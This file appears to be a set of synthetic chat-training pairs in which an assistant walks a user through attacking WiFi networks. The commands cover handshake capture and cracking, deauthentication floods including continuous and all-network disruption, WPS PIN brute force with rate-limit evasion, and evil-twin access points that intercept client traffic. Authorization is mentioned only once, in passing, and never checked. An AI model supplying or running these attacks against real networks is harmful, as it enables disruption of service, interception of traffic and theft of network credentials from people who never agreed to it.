{"conversation": [{"role": "user", "content": "I need to test our office WiFi security. How do I start?"}, {"role": "assistant", "content": "First, enable monitor mode on your wireless adapter with `airmon-ng start wlan0`. This creates wlan0mon interface. Then run `airodump-ng wlan0mon` to scan for networks. You'll see all WiFi networks with their encryption, channels, and connected clients."}]}
{"conversation": [{"role": "user", "content": "I see the target network on channel 6. How do I capture the WPA handshake?"}, {"role": "assistant", "content": "Use `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon` to focus on that network. Then in another terminal, run `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon` to disconnect clients. When they reconnect, you'll see 'WPA handshake' in the airodump-ng window."}]}
{"conversation": [{"role": "user", "content": "I captured a handshake. How do I crack the password?"}, {"role": "assistant", "content": "Use aircrack-ng with a wordlist: `aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap`. It will test each password against the handshake. If the password is in the wordlist, you'll see 'KEY FOUND!' with the password."}]}
{"conversation": [{"role": "user", "content": "The deauth attack isn't working. What's wrong?"}, {"role": "assistant", "content": "First check if your card supports injection with `aireplay-ng --test wlan0mon`. You should see 30/30: 100% success. If injection fails, your card may not support monitor mode properly. Also run `airmon-ng check kill` to stop interfering processes like NetworkManager."}]}
{"conversation": [{"role": "user", "content": "How can I scan for WPS-enabled routers?"}, {"role": "assistant", "content": "Use wash: `wash -i wlan0mon`. It shows all WPS-enabled access points with their lock status. Look for 'Lck: No' - these are unlocked and vulnerable to PIN attacks. The output includes BSSID, channel, WPS version, and vendor."}]}
{"conversation": [{"role": "user", "content": "I found an unlocked WPS router. How do I attack it?"}, {"role": "assistant", "content": "Try Pixie Dust first: `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv`. This exploits weak randomization and recovers the PIN in seconds. If that works, reaver will show both the WPS PIN and WPA password automatically."}]}
{"conversation": [{"role": "user", "content": "Pixie Dust failed. What's the alternative?"}, {"role": "assistant", "content": "Use standard PIN brute force: `reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv`. This tests all possible PINs but takes hours. Add `-d 2 -t 5 -r 3:15` for delays to avoid rate limiting. The router may lock WPS after too many attempts."}]}
{"conversation": [{"role": "user", "content": "How do I capture handshakes from multiple networks automatically?"}, {"role": "assistant", "content": "Use bettercap with a caplet: `bettercap -iface wlan0mon -caplet wifi-handshakes.cap`. Bettercap will scan for networks, deauth clients, and automatically capture handshakes. Check `/root/bettercap-wifi-handshakes.pcap` for captured handshakes."}]}
{"conversation": [{"role": "user", "content": "I want to create a fake WiFi network. How?"}, {"role": "assistant", "content": "Use bettercap: `echo 'wifi.recon on; wifi.ap' | bettercap -iface wlan0mon`. This creates a rogue access point. Configure SSID with `set wifi.ap.ssid FreeWiFi` first. Clients connecting to your fake AP will have their traffic intercepted."}]}
{"conversation": [{"role": "user", "content": "How do I deauth all clients from a specific network?"}, {"role": "assistant", "content": "Run `aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon`. The '0' means continuous attack until you press Ctrl+C. This broadcasts deauth frames, disconnecting all clients from that BSSID."}]}
{"conversation": [{"role": "user", "content": "Can I target a specific client for deauth?"}, {"role": "assistant", "content": "Yes, use `aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon`. The `-c` flag specifies the client MAC. This is more targeted and less disruptive than broadcasting to all clients."}]}
{"conversation": [{"role": "user", "content": "My wireless card doesn't show up in airmon-ng. Why?"}, {"role": "assistant", "content": "Run `airmon-ng` to list interfaces. If nothing appears, your card may not support monitor mode. Check with `iwconfig` - if you see 'Mode:Managed', the card is detected but may not support monitor mode. You need a card with monitor mode support like Atheros or Ralink chipsets."}]}
{"conversation": [{"role": "user", "content": "How do I scan both 2.4 GHz and 5 GHz networks?"}, {"role": "assistant", "content": "Use `airodump-ng --band abg wlan0mon`. The 'abg' flag enables scanning across 802.11a (5 GHz), 802.11b, and 802.11g (both 2.4 GHz). Your wireless card must support dual-band for this to work."}]}
{"conversation": [{"role": "user", "content": "The handshake capture is taking forever. Any tips?"}, {"role": "assistant", "content": "Make sure you're on the correct channel: `airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon`. Wait for clients to appear in the station list, then deauth them. Handshakes are only captured during the 4-way authentication when clients connect or reconnect."}]}
{"conversation": [{"role": "user", "content": "How do I know if I captured a valid handshake?"}, {"role": "assistant", "content": "Airodump-ng shows 'WPA handshake: AA:BB:CC:DD:EE:FF' in the top-right when successful. You can verify with `aircrack-ng capture-01.cap` - it will show 'WPA (1 handshake)' next to the network. If it says '0 handshake', the capture is incomplete."}]}
{"conversation": [{"role": "user", "content": "What's the best wordlist for WPA cracking?"}, {"role": "assistant", "content": "Start with rockyou.txt: `/usr/share/wordlists/rockyou.txt` (14 million passwords). For targeted attacks, create custom wordlists based on the target (company name, location, years). Use crunch to generate wordlists with specific patterns."}]}
{"conversation": [{"role": "user", "content": "Aircrack-ng is too slow. How can I speed it up?"}, {"role": "assistant", "content": "Use hashcat with GPU acceleration instead. First convert the capture: `cap2hccapx.bin capture-01.cap output.hccapx`. Then: `hashcat -m 2500 output.hccapx wordlist.txt`. GPUs are 50-100x faster than CPU cracking."}]}
{"conversation": [{"role": "user", "content": "How do I save the cracked password to a file?"}, {"role": "assistant", "content": "Add `-l` flag: `aircrack-ng -w wordlist.txt -l cracked.txt capture-01.cap`. When the password is found, it's saved to cracked.txt. This is useful for batch processing multiple captures."}]}
{"conversation": [{"role": "user", "content": "What does 'WPS Locked' mean in wash results?"}, {"role": "assistant", "content": "WPS locked means the router has rate limiting enabled after too many failed PIN attempts. It temporarily blocks WPS attacks. 'Lck: Yes' in wash output indicates locked status. Wait 24 hours or try other networks with 'Lck: No'."}]}
{"conversation": [{"role": "user", "content": "How do I stop monitor mode when done?"}, {"role": "assistant", "content": "Run `airmon-ng stop wlan0mon`. This disables monitor mode and restores wlan0 to managed mode. Then restart NetworkManager if needed: `systemctl start NetworkManager` to reconnect to normal WiFi."}]}
{"conversation": [{"role": "user", "content": "Can I use bettercap for mass deauth attacks?"}, {"role": "assistant", "content": "Yes: `echo 'wifi.recon on; wifi.deauth all' | bettercap -iface wlan0mon -eval`. This deauths all clients from all detected access points simultaneously. Use responsibly - this causes widespread disruption. Only use in authorized testing."}]}
{"conversation": [{"role": "user", "content": "How do I capture handshakes and save to custom location?"}, {"role": "assistant", "content": "Use bettercap: `echo 'set wifi.handshakes.file /tmp/handshakes.pcap; wifi.recon on; wifi.deauth AA:BB:CC:DD:EE:FF' | bettercap -iface wlan0mon`. This captures handshakes to your specified path instead of the default location."}]}
{"conversation": [{"role": "user", "content": "What if the password isn't in my wordlist?"}, {"role": "assistant", "content": "You have three options: 1) Use larger wordlists (wpa-dic, kaonashi, weakpass), 2) Generate custom wordlist with crunch/maskprocessor based on password policy, 3) Use GPU cracking with rules to mutate existing wordlists. Pure brute force of all combinations is impractical."}]}
{"conversation": [{"role": "user", "content": "How do I test if my wireless card supports packet injection?"}, {"role": "assistant", "content": "Run `aireplay-ng --test wlan0mon` after enabling monitor mode. You should see 'Injection is working!' and 30/30: 100%. If it shows 0/30, your card doesn't support injection and can't perform deauth attacks."}]}
{"conversation": [{"role": "user", "content": "Why does airodump-ng show 'fixed channel wlan0mon: -1'?"}, {"role": "assistant", "content": "This error means processes are interfering. Run `airmon-ng check kill` to stop NetworkManager, wpa_supplicant, and dhclient. These processes try to use the wireless card and prevent monitor mode from working properly."}]}
{"conversation": [{"role": "user", "content": "How do I crack a specific network when I have multiple in the capture?"}, {"role": "assistant", "content": "Use `-b` flag with BSSID: `aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap`. This targets only the specified network. Otherwise aircrack-ng will ask you to choose from the list."}]}
{"conversation": [{"role": "user", "content": "Can I perform a fake authentication attack?"}, {"role": "assistant", "content": "Yes, use `aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon`. The `-h` is your spoofed MAC. Fake auth is needed for some WEP attacks but rarely useful for WPA2. You'll see 'Authentication successful' if it works."}]}
{"conversation": [{"role": "user", "content": "How do I create an evil twin with the same SSID as the target?"}, {"role": "assistant", "content": "Use bettercap: `set wifi.ap.ssid TargetNetwork; set wifi.ap.channel 6; wifi.recon on; wifi.ap`. Then run deauth on the real AP to force clients to connect to your fake one: `wifi.deauth AA:BB:CC:DD:EE:FF`. Clients won't easily distinguish your AP from the real one."}]}
{"conversation": [{"role": "user", "content": "What's the difference between airodump-ng and wash?"}, {"role": "assistant", "content": "Airodump-ng scans all WiFi networks showing encryption, channels, clients, and captures handshakes. Wash specifically scans for WPS-enabled routers and shows WPS lock status. Use airodump-ng for WPA2 handshake attacks, wash for WPS PIN attacks."}]}
{"conversation": [{"role": "user", "content": "How long does a typical WPS PIN brute force take with reaver?"}, {"role": "assistant", "content": "Without Pixie Dust, reaver must test up to 11,000 PINs. At 1-2 PINs per second, expect 2-6 hours. Many routers have rate limiting or lock after 10-20 attempts. Pixie Dust attack takes seconds but only works on routers with weak randomization. Always try Pixie Dust first with `-K 1`."}]}
